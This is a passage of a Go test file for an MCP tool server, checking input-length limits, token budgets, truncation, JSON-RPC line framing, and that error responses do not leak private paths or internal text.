	if utf8.RuneCountInString(byteBoundedBody) >= mcpMaxFindingBodyChars ||
		len(byteBoundedBody) <= mcpMaxFindingBodyBytes {
		t.Fatalf("bad independent byte-budget fixture: runes=%d bytes=%d",
			utf8.RuneCountInString(byteBoundedBody), len(byteBoundedBody))
	}
	byteBoundedResult := mcpFindingResultMap(t, mcpCallFindingRecord(mustJSON(t, map[string]any{
		"topic": "independent-byte-budget",
		"body":  byteBoundedBody,
	})))
	if code := mcpToolResultErrorCode(t, byteBoundedResult); code != "finding_body_budget_exceeded" {
		t.Fatalf("independent byte budget code = %q, want finding_body_budget_exceeded", code)
	}

	invalid := []struct {
		args map[string]any
		code string
	}{
		{map[string]any{"topic": strings.Repeat("t", mcpMaxFindingTopicChars+1), "body": "x"}, "invalid_topic"},
		{map[string]any{"topic": strings.Repeat("é", mcpMaxFindingTopicChars+1), "body": "x"}, "invalid_topic"},
		{map[string]any{"topic": " padded ", "body": "x"}, "invalid_topic"},
		{map[string]any{"topic": "x", "body": strings.Repeat("b", mcpMaxFindingBodyChars+1)}, "finding_body_budget_exceeded"},
		{map[string]any{"topic": "x", "body": "x", "work_id": nil}, "invalid_work_id"},
		{map[string]any{"topic": "x", "body": "x", "work_id": "job_wrong"}, "invalid_work_id"},
		{map[string]any{"topic": "x", "body": "x", "work_id": "work_" + strings.Repeat("w", mcpMaxFindingWorkIDChars)}, "invalid_work_id"},
		{map[string]any{"topic": "x", "body": "x", "produced_by": nil}, "invalid_produced_by"},
		{map[string]any{"topic": "x", "body": "x", "produced_by": "p" + strings.Repeat("a", mcpMaxFindingProducerChars)}, "invalid_produced_by"},
		{map[string]any{"topic": "x", "body": "x", "produced_by": "bad producer"}, "invalid_produced_by"},
		{map[string]any{"topic": "x", "body": "x", "supersedes": nil}, "invalid_supersedes"},
		{map[string]any{"topic": "x", "body": "x", "supersedes": "find_NOTHEX000000"}, "invalid_supersedes"},
		{map[string]any{"topic": "x", "body": "x", "evidence_refs": nil}, "invalid_evidence_ref"},
		{map[string]any{"topic": "x", "body": "x", "evidence_refs": []string{"not-a-ref"}}, "invalid_evidence_ref"},
		{map[string]any{"topic": "x", "body": "x", "evidence_refs": []string{"git:" + strings.Repeat("a", mcpMaxEvidenceRefChars)}}, "invalid_evidence_ref"},
	}
	for i, tc := range invalid {
		result := mcpFindingResultMap(t, mcpCallFindingRecord(mustJSON(t, tc.args)))
		if code := mcpToolResultErrorCode(t, result); code != tc.code {
			t.Fatalf("invalid boundary %d code = %q, want %q", i, code, tc.code)
		}
	}
	_ = homePath
}

func TestMCPTransportOrientSchemaAndRuntimeBoundariesMatch(t *testing.T) {
	_ = initMCPTestHome(t)
	properties := mcpOrientRecallDescriptor().InputSchema["properties"].(map[string]interface{})
	limits := map[string]int{
		"task": mcpMaxOrientTaskChars, "harness": mcpMaxOrientHarnessChars,
		"cwd": mcpMaxOrientCwdChars, "repo_kind": mcpMaxOrientRepoKindChars,
		"mode": mcpMaxOrientModeChars, "topic": mcpMaxOrientTopicChars,
	}
	for field, want := range limits {
		schema := properties[field].(map[string]interface{})
		if got := schema["maxLength"]; got != want {
			t.Fatalf("schema %s maxLength = %v, want %d", field, got, want)
		}
	}
	budgetSchema := properties["body_budget"].(map[string]interface{})
	if budgetSchema["minimum"] != 0 || budgetSchema["maximum"] != mcpMaxBodyPackTokens {
		t.Fatalf("body_budget schema = %+v", budgetSchema)
	}

	priorRuntime := materializeRuntimeForOrient
	t.Cleanup(func() { materializeRuntimeForOrient = priorRuntime })
	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	valid := map[string]any{
		"task":        strings.Repeat("界", mcpMaxOrientTaskChars),
		"harness":     strings.Repeat("h", mcpMaxOrientHarnessChars),
		"cwd":         string(os.PathSeparator) + strings.Repeat("c", mcpMaxOrientCwdChars-1),
		"repo_kind":   strings.Repeat("r", mcpMaxOrientRepoKindChars),
		"mode":        "review",
		"topic":       strings.Repeat("o", mcpMaxOrientTopicChars),
		"body_budget": 0,
	}
	if result := mcpFindingResultMap(t, mcpCallOrientRecall(mustJSON(t, valid))); result["isError"] == true {
		t.Fatalf("valid orient boundaries rejected: %+v", result)
	}

	invalid := []struct {
		field string
		value any
		code  string
	}{
		{"task", strings.Repeat("t", mcpMaxOrientTaskChars+1), "invalid_task"},
		{"task", strings.Repeat("界", mcpMaxOrientTaskChars+1), "invalid_task"},
		{"task", "   ", "invalid_task"},
		{"harness", nil, "invalid_harness"},
		{"harness", strings.Repeat("h", mcpMaxOrientHarnessChars+1), "invalid_harness"},
		{"cwd", nil, "invalid_cwd"},
		{"cwd", strings.Repeat("c", mcpMaxOrientCwdChars+1), "invalid_cwd"},
		{"repo_kind", nil, "invalid_repo_kind"},
		{"repo_kind", strings.Repeat("r", mcpMaxOrientRepoKindChars+1), "invalid_repo_kind"},
		{"mode", nil, "invalid_mode"},
		{"mode", "invalid", "invalid_mode"},
		{"topic", nil, "invalid_topic"},
		{"topic", strings.Repeat("o", mcpMaxOrientTopicChars+1), "invalid_topic"},
		{"body_budget", nil, "body_pack_token_budget_invalid"},
		{"body_budget", -1, "body_pack_token_budget_invalid"},
		{"body_budget", mcpMaxBodyPackTokens + 1, "body_pack_token_budget_invalid"},
	}
	for _, tc := range invalid {
		args := map[string]any{"task": "boundary probe"}
		args[tc.field] = tc.value
		result := mcpFindingResultMap(t, mcpCallOrientRecall(mustJSON(t, args)))
		if code := mcpToolResultErrorCode(t, result); code != tc.code {
			t.Fatalf("%s invalid code = %q, want %q", tc.field, code, tc.code)
		}
	}
}

func TestMCPTransportBudgetSemanticsAndBoundedSafeOrientAck(t *testing.T) {
	homePath := initMCPTestHome(t)
	priorRuntime, priorBodies := materializeRuntimeForOrient, materializeBodiesForOrient
	t.Cleanup(func() { materializeRuntimeForOrient, materializeBodiesForOrient = priorRuntime, priorBodies })
	privateRef := filepath.Join(string(os.PathSeparator), "synthetic", "private", "artifact")
	materializeRuntimeForOrient = func(in contract.Input, pol contract.OrientationPolicy, _ string, now time.Time) (contract.RuntimeMaterialization, error) {
		ec := contract.Compile(in, pol, now)
		pack := contract.Pack(in, pol, now)
		pack.SummaryMD = "safe prefix /private/recognizable-summary-secret/file.txt " + strings.Repeat("s", mcpMaxSummaryBytes+200)
		pack.ActiveDecisions = []string{"decision:ok", privateRef, strings.Repeat("r", mcpMaxRecallRefBytes+1)}
		pack.ActiveMemory = make([]string, mcpMaxRecallRefs+1)
		for i := range pack.ActiveMemory {
			pack.ActiveMemory[i] = fmt.Sprintf("claim:%03d", i)
		}
		return contract.RuntimeMaterialization{EffectiveContract: ec, ContextPack: pack}, nil
	}
	seenBudget := -1
	materializeBodiesForOrient = func(_ string, pack envelope.ContextPack, _, _ string, budget int) (envelope.ContextPack, error) {
		seenBudget = budget
		return pack, nil
	}
	args := map[string]any{"task": "budget boundary", "body_budget": mcpMaxBodyPackTokens}
	result := mcpFindingResultMap(t, mcpCallOrientRecall(mustJSON(t, args)))
	if isErr, _ := result["isError"].(bool); isErr {
		t.Fatalf("max token budget rejected: %+v", result)
	}
	if seenBudget != mcpMaxBodyPackTokens {
		t.Fatalf("body-pack token budget = %d, want %d", seenBudget, mcpMaxBodyPackTokens)
	}
	ack := decodeMCPStructuredContent(t, result)
	if len(ack["summary_md"].(string)) > mcpMaxSummaryBytes {
		t.Fatalf("summary exceeded cap")
	}
	encoded := string(mustJSON(t, ack))
	if strings.Contains(encoded, privateRef) || strings.Contains(encoded, homePath) ||
		strings.Contains(encoded, "recognizable-summary-secret") {
		t.Fatalf("orient ack leaked private absolute path: %s", encoded)
	}
	if !strings.Contains(encoded, "summary_truncated") {
		t.Fatalf("orient ack omitted combined summary truncation warning: %s", encoded)
	}
	if len(ack["active_memory"].([]interface{})) != mcpMaxRecallRefs {
		t.Fatalf("active memory not capped: %+v", ack["active_memory"])
	}
	if code := mcpToolResultErrorCode(t, mcpFindingResultMap(t, mcpCallOrientRecall(mustJSON(t, map[string]any{
		"task": "too many tokens", "body_budget": mcpMaxBodyPackTokens + 1,
	})))); code != "body_pack_token_budget_invalid" {
		t.Fatalf("over-token-budget code = %q", code)
	}
}

func TestMCPTransportErrorsNeverLeakRawInternalTextOrPaths(t *testing.T) {
	homePath := initMCPTestHome(t)
	findingArgs := map[string]any{"topic": "storage-error-probe", "body": "synthetic body sentinel"}
	first := mcpFindingResultMap(t, mcpCallFindingRecord(mustJSON(t, findingArgs)))
	findingAck := decodeMCPStructuredContent(t, first)
	findingPath := filepath.Join(homePath, finding.Subdir, findingAck["id"].(string)+".json")
	if err := os.WriteFile(findingPath, []byte("malformed synthetic record\n"), 0o600); err != nil {
		t.Fatalf("corrupt synthetic finding: %v", err)
	}
	findingFailure := mcpFindingResultMap(t, mcpCallFindingRecord(mustJSON(t, findingArgs)))
	findingWire := string(mustJSON(t, findingFailure))
	if strings.Contains(findingWire, homePath) || strings.Contains(findingWire, "synthetic body sentinel") || strings.Contains(findingWire, "malformed") {
		t.Fatalf("finding error leaked raw storage detail: %s", findingWire)
	}
	if code := mcpToolResultErrorCode(t, findingFailure); code != "finding_record_failed" {
		t.Fatalf("finding error code = %q", code)
	}

	priorRuntime := materializeRuntimeForOrient
	t.Cleanup(func() { materializeRuntimeForOrient = priorRuntime })
	sentinel := filepath.Join(homePath, "synthetic-secret") + ": internal detail"
	materializeRuntimeForOrient = func(contract.Input, contract.OrientationPolicy, string, time.Time) (contract.RuntimeMaterialization, error) {
		return contract.RuntimeMaterialization{}, errors.New(sentinel)
	}
	result := mcpFindingResultMap(t, mcpCallOrientRecall(mustJSON(t, map[string]any{"task": "error probe"})))
	encoded := string(mustJSON(t, result))
	if strings.Contains(encoded, sentinel) || strings.Contains(encoded, homePath) || strings.Contains(encoded, "internal detail") {
		t.Fatalf("tool error leaked raw internal text: %s", encoded)
	}
	if code := mcpToolResultErrorCode(t, result); code != "orient_materialization_failed" {
		t.Fatalf("error code = %q", code)
	}

	lines := runMCPTransport(t, nil, []string{`{"jsonrpc":"2.0","id":9,"method":"private/` + sentinel + `"}`}, homePath)
	wire := strings.Join(lines, "\n")
	if strings.Contains(wire, sentinel) || strings.Contains(wire, homePath) {
		t.Fatalf("JSON-RPC error leaked method/path: %s", wire)
	}
}

func mcpFindingResultMap(t *testing.T, raw interface{}) map[string]interface{} {
	t.Helper()
	encoded := mustJSON(t, raw)
	var result map[string]interface{}
	if err := json.Unmarshal(encoded, &result); err != nil {
		t.Fatalf("decode tool result: %v", err)
	}
	return result
}

func mcpToolResultErrorCode(t *testing.T, result map[string]interface{}) string {
	t.Helper()
	if isErr, _ := result["isError"].(bool); !isErr {
		t.Fatalf("tool result is not an error: %+v", result)
	}
	payload := decodeMCPStructuredContent(t, result)
	errorObj, ok := payload["error"].(map[string]interface{})
	if !ok {
		t.Fatalf("tool error payload missing: %+v", payload)
	}
	code, _ := errorObj["code"].(string)
	return code
}

// ---------- Framing ----------

func TestMCPTransportOverCapLineRefusesAndClosesQuietly(t *testing.T) {
	_ = initMCPTestHome(t)
	priorIn, priorOut := ioIn, ioOut
	t.Cleanup(func() { ioIn, ioOut = priorIn, priorOut })
	oversized := strings.Repeat("x", mcpMaxLineBytes+1) + "\n"
	ioIn = strings.NewReader(oversized)
	var outBuf bytes.Buffer
	ioOut = &outBuf
	if err := runMcpTransportLoop(); err != nil {
		t.Fatalf("transport loop returned error on over-cap line: %v", err)
	}
	if outBuf.Len() != 0 {
		t.Fatalf("over-cap line produced output, want none: %q", outBuf.String())
	}
}

func TestMCPTransportBlankLinesIgnoredBetweenEnvelopes(t *testing.T) {
	homePath := initMCPTestHome(t)
	a := `{"jsonrpc":"2.0","id":1,"method":"ping"}` + "\n"
	b := `{"jsonrpc":"2.0","id":2,"method":"ping"}` + "\n"
	lines := runMCPTransport(t, nil, []string{a, "\n", "  \n", b, "\n"}, homePath)
	if len(lines) < 2 {
		t.Fatalf("blank-line skipping lost envelopes: %+v", lines)
	}
	rawResp(t, lines, 1)
	rawResp(t, lines, 2)
}

// ---------- Helpers ----------

func decodeMCPStructuredContent(t *testing.T, result map[string]interface{}) map[string]interface{} {
	t.Helper()
	if _, exists := result["structuredContent"]; exists {
		t.Fatalf("result must not emit unadvertised structuredContent: %+v", result)
	}
	content, ok := result["content"].([]interface{})
	if !ok || len(content) != 1 {
		t.Fatalf("result missing single content block: %+v", result)
	}
	block, ok := content[0].(map[string]interface{})
	if !ok || block["type"] != "text" {
		t.Fatalf("result content is not text: %+v", result)
	}
	text, ok := block["text"].(string)
	if !ok {
		t.Fatalf("result text missing: %+v", result)
	}
	var decoded map[string]interface{}
	if err := json.Unmarshal([]byte(text), &decoded); err != nil {
		t.Fatalf("decode result text: %v", err)
	}
	return decoded
}

func mustJSON(t *testing.T, v interface{}) []byte {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return b
}
